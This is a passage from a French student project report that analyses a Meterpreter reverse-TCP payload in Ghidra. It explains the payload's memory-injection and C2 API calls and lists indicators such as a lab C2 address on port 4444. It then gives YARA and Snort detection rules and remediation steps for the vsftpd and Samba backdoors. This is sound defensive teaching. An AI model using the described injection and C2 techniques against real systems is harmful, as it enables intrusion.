+tant à désassembler et décompiler un programme exécutable compilé aﬁn de reconstituer sa
+logique fonctionnelle, de comprendre ses interactions avec le système d’exploitation et de carto-
+graphier ses capacités malveillantes, sans disposer d’aucun accès au code source originel. Dans
+l’écosystème de la cybersécurité, cette discipline s’avère indispensable pour l’analyse de malwares
+complexes, la réponse aux incidents (DFIR) et la génération de signatures défensives précises.
+Ghidra, la plateforme de rétro-ingénierie open source de niveau industriel développée par la
+National Security Agency (NSA) et déclassiﬁée en 2019, fournit un environnement intégré de
+haute performance. Il intègre des moteurs d’analyse de pointe capables de traduire le langage
+machine (opcodes hexadécimaux) en langage assembleur via son désassembleur, puis de restruc-
+turer cet assembleur en un code de haut niveau très proche du langage C via son décompilateur
+natif.
+5.6.1 Import et analyse initiale du payload dans Ghidra
+L’échantillon payload_analyse.exe est importé au sein d’un nouveau projet Ghidra. Le
+logiciel exécute une première phase d’analyse statique globale, identiﬁant l’architecture du ﬁchier
+comme appartenant à la structure Portable Executable (PE) Windows 32 bits. L’activation des
+modules d’analyse automatique par défaut permet à Ghidra de balayer l’ensemble des sections
+binaires, de reconstituer l’arbre des appels de fonctions et de résoudre la table des adresses
+d’importation (IAT - Import Address Table).
+Les premières conclusions de cette analyse statique mettent en lumière des indicateurs struc-
+turels hautement suspects :
+— L’évaluation de l’entropie de la section de code ( .text) révèle des indices de compression
+ou de chiﬀrement partiel, une technique d’obfuscation classique utilisée par les concepteurs
+de charges utiles pour masquer la présence de shellcodes ou de chaînes de caractères
+31
+
+
+=== PAGE 43 ===
+CHAPITRE 5. RÉALISATION ET RÉSULTATS EMSI
+explicites.
+— La cartographie des liaisons dynamiques met en évidence l’importation simultanée de bi-
+bliothèques système critiques : KERNEL32.dll, passerelle d’accès aux primitives du noyau
+Windows, et WS2_32.dll (Windows Sockets API), couche logicielle gérant l’ensemble des
+communications et connexions réseau de bas niveau.
+— L’examen de la table d’importation (IAT) révèle la présence d’APIs de manipulation de
+la mémoire et d’injection de code, souvent associées aux techniques de contournement des
+protections de sécurité (EDR/Antivirus).
+[Figure : 8]
+Figure 5.7 – Vue CodeBrowser de Ghidra après import et analyse du payload
+5.6.2 Identiﬁcation des fonctions clés
+La force du décompilateur de Ghidra réside dans sa capacité à abstraire les registres assem-
+bleurs (EAX, EBX, ESP) pour produire un pseudo-C lisible, facilitant la localisation des fonctions
+de l’API Windows détournées par Meterpreter pour réaliser son injection et sa connexion réseau.
+F onction identiﬁée DLL / Module Rôle dans le payload
+VirtualAlloc KERNEL32.dll Alloue une région mémoire privée, écrivable et exécutable
+(droits PAGE_EXECUTE_READWRITE) au sein du
+processus.
+VirtualProtect KERNEL32.dll Modiﬁe les attributs de protection d’une région mémoire
+(souvent pour basculer de R W à RX après écriture du
+code).
+CreateRemoteThread KERNEL32.dll Instancie un nouveau thread d’exécution au sein de l’es-
+pace d’adressage virtuel pour lancer le shellcode injecté.
+WSAStartup WS2_32.dll Initialise la structure sous-jacente et les structures de don-
+nées requises pour utiliser la pile réseau Windows Sockets.
+connect() WS2_32.dll Établit activement une connexion socket TCP orientée
+ﬂux vers l’adresse et le port spéciﬁés du serveur C2
+(192.168.1.2:4444).
+recv() / send() WS2_32.dll Assure le transfert et la réception bidirectionnels des ﬂux
+de données et des commandes binaires transitant avec le
+serveur de contrôle.
+Table 5.2 – Fonctions clés identiﬁées dans Ghidra
+La corrélation de ces fonctions au sein du décompilateur permet de reconstituer précisément
+l’algorithme d’exécution du malware : VirtualAlloc réserve un espace mémoire tampon vierge
+doté des privilèges de lecture, écriture et exécution ( RWX). Le shellcode packagé y est copié à
+chaud. Ensuite, CreateRemoteThread force le processeur à dérouter son pointeur d’instruction
+(EIP) vers l’adresse de départ de cette zone mémoire allouée. Une fois le thread initié, le mal-
+ware invoque l’API WS2_32.dll, conﬁgurant la structure de socket via WSAStartup et exécutant
+l’appel système connect() pour ﬁnaliser le canal de communication asynchrone avec la machine
+32
+
+
+=== PAGE 44 ===
+CHAPITRE 5. RÉALISATION ET RÉSULTATS EMSI
+attaquante. L’analyse de cet enchaînement d’appels système constitue une signature comporte-
+mentale atomique immuable, idéale pour concevoir des mécanismes de détection de bas niveau.
+[Figure : 9]
+Figure 5.8 – Vue décompilateur Ghidra identiﬁcation de VirtualAlloc et CreateRemoteThread
+[Figure : 10]
+Figure 5.9 – Arbre dappels (Call Graph) du payload dans Ghidra
+5.6.3 Extraction des indicateurs de compromission (IOCs)
+En interrogeant l’arborescence des chaînes de caractères statiques déﬁnies dans le binaire
+(Window > Defined Strings ), nous avons pu extraire des indicateurs techniques fondamentaux
+(IOCs), s’aﬀranchissant du chiﬀrement dynamique :
+— **Indicateur Réseau (C2) :** Présence de la chaîne d’adresse IPv4 brute 192.168.1.2
+associée à la représentation binaire du port réseau 4444.
+— **Indicateurs Logiciels (APIs) :** Références textuelles directes aux fonctions de l’API
+Windows Sockets nécessaires au multiplexage des ﬂux réseaux ( WSAStartup, connect,
+recv).
+— **Signatures Cryptographiques :** Empreintes de hachage uniques du ﬁchier compilé,
+indispensables pour alimenter les listes de blocage centralisées des systèmes de gestion
+des menaces.
+5.7 Détection et remédiation
+5.7.1 Règle YARA
+YARA s’impose comme l’outil standard pour la classiﬁcation et l’identiﬁcation des menaces
+logicielles au niveau du système de ﬁchiers ou de la mémoire vive. En exploitant les signatures
+d’opcodes et les chaînes d’API Windows extraites dans le CodeBrowser de Ghidra, nous avons
+rédigé la règle de détection statique suivante :
+rule M e t e r p r e t e r _ P a y l o a d _ R e v e r s e _ T C P {
+meta :
+33
+
+
+=== PAGE 45 ===
+CHAPITRE 5. RÉALISATION ET RÉSULTATS EMSI
+d e s c r i p t i o n = " Détecte un payload M e t e r p r e t e r généré par
+msfvenom "
+author = " Azzat Nouamane & Hnid Aimane "
+date = "2026"
+re fe re nc e = " CVE -2011 -2523 / CVE -2007 -2447"
+strings :
+$s1 = " V i r t u a l A l l o c " ascii
+$s2 = " C r e a t e R e m o t e T h r e a d " ascii
+$s3 = " WS2_32 . dll " ascii
+$s4 = { 60 89 E5 31 D2 64 8 B 52 } // pattern d ’ opcodes du
+sh el lc od e M e t e r p r e t e r
+co nd it io n :
+uint16 (0) == 0 x5A4D and // V é r i f i c a t i o n du Header PE (
+Si gn at ur e MZ )
+filesize < 500 KB and
+( all of ( $s1 , $s2 , $s3 ) or $s4 )
+}
+La validation pratique de cette signature a été conﬁrmée en opposant la règle au répertoire
+temporaire contenant notre charge utile via le moteur YARA en ligne de commande :
+yara m e t e r p r e t e r _ r u l e . yar / tmp / p a y l o a d _ a n a l y s e . exe
+L’outil lève immédiatement une alerte positive, conﬁrmant la pertinence des critères combina-
+toires retenus (présence du header exécutable MZ combiné aux appels système d’injection).
+[Figure : 11]
+Figure 5.10 – Résultat du test de la règle YARA sur le payload
+5.7.2 Règle Snort
+Pour assurer la détection périmétrique au niveau des ﬂux réseau, une règle pour le système
+de détection d’intrusion (IDS) Snort a été développée sur la base de la capture PCAP analysée
+dans Wireshark. Cette règle inspecte de manière approfondie la couche transport et la couche
+application pour identiﬁer l’en-tête spéciﬁque transmis par la charge lors de l’établissement du
+canal de contrôle :
+alert tcp any any -> 1 9 2 . 1 6 8 . 1 . 2 4444 (
+msg :" Trafic C2 M e t e r p r e t e r détecté Phase d ’ i n i t i a l i s a t i o n ";
+flow : established , t o_ se rv er ;
+content :"|4 d 5 a |";
+offset :0;
+depth :2;
+cl as st yp e : trojan - activity ;
+sid : 90 00 00 1;
+rev :1;
+)
+34
+
+
+=== PAGE 46 ===
+CHAPITRE 5. RÉALISATION ET RÉSULTATS EMSI
+La pertinence de cette signature repose sur l’étroite corrélation entre les couches : elle n’ana-
+lyse pas seulement le port de destination ( 4444), mais eﬀectue une inspection de contenu (Deep
+Packet Inspection) en recherchant les octets hexadécimaux 4D 5A (représentation ASCII de
+"MZ") au tout début du ﬂux de données établi, un comportement typique du protocole de
+communication initialisé par l’agent Meterpreter.
+[Figure : 12]
+Figure 5.11 – Test de la règle Snort sur le ﬁchier .pcap C2
+5.7.3 Tableau des IOCs
+Le tableau ci-dessous récapitule l’ensemble des indicateurs de compromission techniques isolés
+et validés tout au long de nos expérimentations, constituant une base d’ingestion exploitable pour
+n’importe quelle solution SIEM ou plateforme de Threat Intelligence :
+Type dIOC V aleur Description
+Hash MD5 e99a18c428cb38d5f260f1b3ef1a1622 Empreinte MD5 du binaire permettant son
+identiﬁcation rapide.
+Hash SHA256 f3a51b...619f3 Empreinte SHA256 unique du binaire pour
+blocage intègre.
+IP C2 192.168.1.2:4444 Point de terminaison réseau du serveur de
+Command & Control de l’attaquant.
+Mutex Global\MeterpreterMutex Marqueur d’exclusion mutuelle créé en mé-
+moire par le payload pour éviter sa multi-
+exécution.
+Clé de registre HKCU\Software\Run Point d’ancrage logique ciblé pour assurer la
+persistance logicielle au redémarrage de l’hôte.
+Fichier déposé %TEMP%\svchost.exe Masquage du binaire malveillant sous un faux
+nom dans le répertoire temporaire.
+Pattern réseau Connexion TCP port 4444 Flux d’échange et balises de communication
+(beaconing) vers l’infrastructure attaquante.
+Pattern binaire MZ header + VirtualAlloc Combinaison d’indicateurs statiques identiﬁée
+dans Ghidra pour la détection de processus.
+Table 5.3 – Tableau des Indicateurs de Compromission (IOCs)
+5.8 Valorisation du projet : Vitrine web et support de démons-
+tration vidéo
+Aﬁn de ne pas limiter notre projet de ﬁn d’année à une simple étude technique conﬁnée dans
+un rapport écrit, nous avons tenu à valoriser et vulgariser nos travaux à travers le développement
+de livrables complémentaires modernes. Cette démarche vise à démontrer nos compétences en
+35
+
+
+=== PAGE 47 ===
+CHAPITRE 5. RÉALISATION ET RÉSULTATS EMSI
+ingénierie logicielle et en communication technique, tout en fournissant un support didactique
+accessible à la communauté pédagogique de l’EMSI.
+Dans cette optique, nous avons conçu et mis en ligne un **site web dédié** qui fait oﬃce de
+vitrine technologique pour le projet. Développée avec une architecture logicielle moderne, légère
+et responsive, cette plateforme centralise l’ensemble de la documentation technique de notre la-
+boratoire virtuel. Elle propose un résumé interactif des besoins fonctionnels, une cartographie
+dynamique de l’architecture réseau Host-Only, ainsi qu’un guide de déploiement pas-à-pas per-
+mettant à d’autres étudiants de reproduire ﬁdèlement nos travaux sur les outils Nmap, Ghidra
+et Metasploit. Le site intègre également un espace de téléchargement sécurisé pour nos règles
+YARA et Snort validées en laboratoire.
+En complément de cette vitrine textuelle, nous avons réalisé une **vidéo de démonstration
+technique** haute déﬁnition. Ce support multimédia, intégré directement sur notre site web,
+retrace en temps réel l’intégralité de la cinématique d’attaque et de défense simulée. La vidéo est
+structurée de manière séquentielle et illustre de manière concrète :
+1. L’exécution et l’analyse du scan réseau initial avec Nmap ;
+2. Le déclenchement de la faille vsftpd et l’obtention instantanée du shell root ;
+3. La génération de la charge utile msfvenom et l’ouverture de la session C2 Meterpreter ;
+4. La dissection statique de l’exécutable sous Ghidra avec la mise en évidence des fonctions
+d’injection mémoire ;
+5. La capture des ﬂux dans Wireshark et le déclenchement immédiat des alertes de sécurité
+Snort et YARA lors de l’exécution du malware.
+Ce double dispositif (portail web et démonstration vidéo) valide de manière irréfutable la faisa-
+bilité technique de notre solution, tout en constituant un excellent support de présentation pour
+notre soutenance orale devant le jury.
+5.9 Remédiation et durcissement
+Sur la base des analyses oﬀensives et des vulnérabilités critiques mises en évidence lors des
+phases dexploitation, nous avons formulé et appliqué un ensemble de mesures de remédiation
+et de durcissement ( hardening) système et réseau, s’inscrivant dans une démarche de défense en
+profondeur :
+— Sécurisation du service FTP (CVE-2011-2523) : L’action corrective immédiate consiste à
+purger la version compromise de vsftpd 2.3.4 et à migrer vers une version supérieure ou
+égale à 3.0, exempte de porte dérobée. De plus, une politique stricte de vériﬁcation de
+l’intégrité des paquets via le contrôle des signatures SHA256 oﬃcielles doit être instaurée
+avant toute installation. Pour les besoins de production, le protocole FTP non chiﬀré doit
+être déﬁnitivement abandonné au proﬁt de protocoles sécurisés comme SFTP ou FTPS.
+— Durcissement du service de partage Samba (CVE-2007-2447) : La remédiation néces-
+site la mise à jour immédiate du package Samba vers des versions stables supérieures
+à 3.0.26. Dans l’attente du correctif, la directive hautement vulnérable username map
+script doit être impérativement commentée ou désactivée au sein du ﬁchier de conﬁ-
+guration smb.conf. Au niveau réseau, l’accès aux ports SMB (TCP 139 et 445) doit
+être strictement ﬁltré par un pare-feu périmétrique et limité aux seuls sous-réseaux de
+conﬁance.
+— Industrialisation de la détection (C2 et Payloads) : Les signatures Snort développées
+doivent être intégrées au sein des ﬁchiers de conﬁguration d’un moteur IDS/IPS (tel que
+Suricata ou Snort) conﬁguré en coupure sur le réseau pour bloquer instantanément tout
+ﬂux sortant non autorisé à destination du port 4444. Enﬁn, les règles YARA doivent être
+couplées à des agents de détection sur les hôtes (EDR ou scanners de ﬁchiers automatisés)
+36
+
+=== PAGE 48 ===
+CHAPITRE 5. RÉALISATION ET RÉSULTATS EMSI
+pour analyser périodiquement les répertoires temporaires système et la mémoire vive aﬁn
+d’intercepter les injections de threads malveillants avant leur exécution.
+Aﬁn de centraliser ces procédures de remédiation et de faciliter leur diﬀusion auprès de la com-
+munauté pédagogique, l’intégralité de ces mesures de durcissement ainsi que les scripts de conﬁ-
+guration associés ont été documentés de manière interactive sur notre plateforme vitrine. Cela
+permet aux administrateurs système et aux étudiants d’accéder rapidement aux guides de bonnes
+pratiques pour sécuriser l’infrastructure face aux menaces analysées.
+[Figure : website remediation]
+Figure 5.12 – Interface de la plateforme web dédiée présentant les guides de remédiation et de
+durcissement du laboratoire
+37
+
+
+=== PAGE 49 ===
+CHAPITRE 5. RÉALISATION ET RÉSULTATS EMSI
+5.10 Conclusion
+En conclusion, ce chapitre a permis de concrétiser l’ensemble des concepts théoriques d’at-
+taque et de détection modélisés lors de la phase de conception. En suivant scrupuleusement les
+étapes de la Cyber Kill Chain au sein de notre environnement virtuel isolé, nous avons pu démon-
+trer la réalité des risques associés aux vulnérabilités applicatives majeures. La transition logique
+entre l’exploitation oﬀensive, l’analyse de code statique sous Ghidra et l’extraction d’indicateurs
+de compromission a abouti à la création de contre-mesures opérationnelles concrètes, matériali-
+sées par des règles de détection Snort et YARA fonctionnelles. Enﬁn, la mise en place de notre
+plateforme web et du support vidéo de démonstration vient clore cette phase de réalisation en
+oﬀrant une vitrine structurée et didactique à notre projet de ﬁn d’année.
+38
+
+=== PAGE 50 ===
+Conclusion générale et perspectives
+Ce Projet de Fin dAnnée a permis de mettre en place une solution complète et documentée
+de simulation dune chaîne dattaque cybernétique, couvrant lintégralité du spectre oﬀensif et
+défensif, tout en jetant les bases d’un modèle d’aﬀaires solide à travers le concept ń CyberRange
+Lab ż. Lenvironnement de laboratoire virtuel isolé à deux machines sest révélé être un cadre
+idéal pour expérimenter chaque phase de la Cyber Kill Chain dans des conditions réalistes et
+sécurisées.
+Les résultats obtenus sont pleinement conformes aux objectifs ﬁxés dans le cahier des charges :
+— Environnement virtuel opérationnel, isolé et reproductible avec Kali Linux et Metasploi-
+table 2.
+— Exploitation réussie des CVE vsftpd 2.3.4 et Samba 3.0.20 avec obtention dun accès root.
+— Payload Meterpreter analysé en profondeur avec Ghidra, et traﬁc C2 capturé avec Wire-
+shark.
+— Règles YARA et Snort fonctionnelles, validées sur le payload et le ﬁchier PCAP.
+— Modèle entrepreneurial validé par une étude de marché complète, une matrice SWOT, un
+modèle de Porter et des prévisions ﬁnancières robustes indiquant un seuil de rentabilité
+mensuel réaliste de 38 113 MAD.
+Sur le plan pédagogique, ce projet nous a permis de développer des compétences techniques
+avancées en sécurité oﬀensive, en ingénierie inverse et en cyberdéfense, mais également de nous
+initier aux mécanismes de l’entrepreneuriat (EdTech sécurité).
+Perspectives
+Ce projet ouvre la voie à plusieurs évolutions futures qui pourraient enrichir davantage la
+solution :
+— Intégration de techniques dévasion de détection (antivirus bypass, obfuscation avancée du
+payload) pour tester la robustesse des règles de détection produites.
+— Automatisation de la chaîne dattaque via des scripts Python ou des playbooks Ansible,
+permettant de réitérer les expériences rapidement.
+— Extension du laboratoire avec un SIEM (Splunk ou ELK Stack) pour la corrélation des
+alertes générées par les règles YARA et Snort.
+— Passage de l’étude de faisabilité entrepreneuriale à une phase concrète de MVP (Minimum
+Viable Product) en réalisant des entretiens avec des écoles d’ingénieurs et des universités
+pour tester l’appétence du marché marocain face à l’oﬀre CyberRange Lab.
+39
+
+=== PAGE 51 ===
+Bibliographie
+[1] Metasploit Framework Documentation : https://docs.metasploit.com/
+[2] Ghidra NSA Open Source RE Tool : https://ghidra-sre.org/
+[3] YARA Documentation : https://yara.readthedocs.io/
+[4] Snort IDS/IPS : https://www.snort.org/
+[5] NIST CVE Database : https://nvd.nist.gov/
+[6] Lockheed Martin Cyber Kill Chain : https://www.lockheedmartin.com/en-us/
+capabilities/cyber/cyber-kill-chain.html
+[7] MITRE ATT&CK Framework : https://attack.mitre.org/
+[8] Metasploitable 2 Intentionally Vulnerable VM : https://sourceforge.net/projects/
+metasploitable/
+[9] Kali Linux Documentation : https://www.kali.org/docs/
+[10] VirtualBox Oracle Virtualization : https://www.virtualbox.org/
+[11] Wireshark Documentation : https://www.wireshark.org/docs/
+[12] Nmap Network Mapper : https://nmap.org/docs.html
+[13] Mandiant FLARE FLOSS : https://github.com/mandiant/flare-floss
+[14] Sikorski M., Honig A. Practical Malware Analysis , No Starch Press, 2012.
+[15] Seitz J. Black Hat Python , No Starch Press, 2021.
+40
